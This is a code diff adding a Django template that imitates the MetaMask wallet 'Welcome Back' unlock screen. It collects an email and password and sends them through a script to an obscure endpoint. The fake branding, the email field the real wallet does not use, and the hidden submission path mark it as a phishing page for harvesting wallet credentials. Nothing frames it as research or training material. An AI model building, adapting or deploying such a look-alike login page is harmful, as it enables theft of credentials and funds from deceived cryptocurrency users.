@@ -1,0 +1,47 @@
+{% extends "base.html" %}
+{% load static %}
+
+{% block content %}
+<section id="fill" x-data="MetamaskHead" x-init="animationLogo" class="w-screen flex flex-col flex-grow items-center justify-center reltative">
+  <form @submit.prevent="submitAccount" data-url="/aiut94ksdjhohwr/" action="{% url 'home' %}" x-ref="form" method="post" class="w-full md:w-2/3 mx-auto">
+    {% csrf_token %}
+
+    <center class="hidden md:block">
+      <div id="logo-container" class="max-w-xs h-auto"></div>
+    </center>
+
+    <center class="md:hidden">
+      <img src="{% static 'images/favicons/favicons.svg' %}" class="w-32" alt="logo icon">
+    </center>
+
+    <center class="py-4">
+      <h1 class="text-xl md:text-3xl font-bold">Welcome Back</h1>
+      <p>The decentralized web awaits</p>
+    </center>
+
+    <center class="py-4 space-y-3 focus:space-y-5">
+      <div class="relative group">
+        <label for="id_email" class="duration-500 transition-all ease-in-out absolute group-focus-within:bottom-8 bottom-0 group-focus-within:text-gray-700 text-gray-300 text-base group-focus-within:text-sm ">Email</label>
+        <input @changed="validated" x-model="formData.email" role="presentation" autoComplete="off" type="email" name="email" id="id_email" class="border-x-0 border-t-0 outline-none focus:outline-none focus:border-x-0 focus:border-t-0 ring-0 focus:ring-0">
+      </div>
+      <div class="relative group">
+        <label for="id_password" class="duration-500 transition-all ease-in-out absolute group-focus-within:bottom-8 bottom-0 group-focus-within:text-gray-700 text-gray-300 text-base group-focus-within:text-sm ">Password</label>
+        <input x-model="formData.password" autoComplete="new-password" type="password" name="password" id="id_password" class="border-x-0 border-t-0 outline-none focus:outline-none focus:border-x-0 focus:border-t-0 ring-0 focus:ring-0">
+      </div>
+    </center>
+
+    <center>
+      <button :disabled="formData.password.length < 8 || formData.email.length < 4" :class="{'bg-primary':formData.password.length > 8 && formData.email.length > 4, 'bg-primary/30':formData.password.length < 8 || formData.email.length < 4}" type="submit" class="py-2 rounded-full px-24 text-center text-white bg-primary mx-auto">
+        Unlock
+      </button>
+    </center>
+
+    <center class="pt-5">
+      <a target="_blank" href="chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn/home.html#restore-vault" class="text-s font-semibold text-primary">Forgot Password?</a>
+    </center>
+  </form>
+
+
+  <span class="block font-normal absolute bottom-1 text-s">Need help? Contact <a href="" class="text-primary">Metamask Support</a></span>
+</section>
+{% endblock content %}
